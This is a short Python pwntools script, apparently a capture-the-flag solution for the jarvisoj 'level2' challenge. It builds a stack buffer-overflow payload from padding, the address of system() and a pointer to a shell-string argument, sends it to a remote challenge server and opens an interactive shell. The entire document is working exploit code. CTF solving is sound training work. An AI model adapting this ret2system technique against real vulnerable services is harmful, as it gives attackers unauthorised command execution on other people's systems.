from pwn import *

sh = remote('pwn2.jarvisoj.com','9878')
level2 = ELF('./level2')

padding = 'a'*(0x88+4)
# system_addr = p32(level2.plt['system'])
system_addr = p32(0x08048320)
argv_r = p32(0x804a024)
payload = padding+system_addr+'a'*4+argv_r  #'aaaa' probebly is system's return address
sh.sendline(payload)
sh.interactive()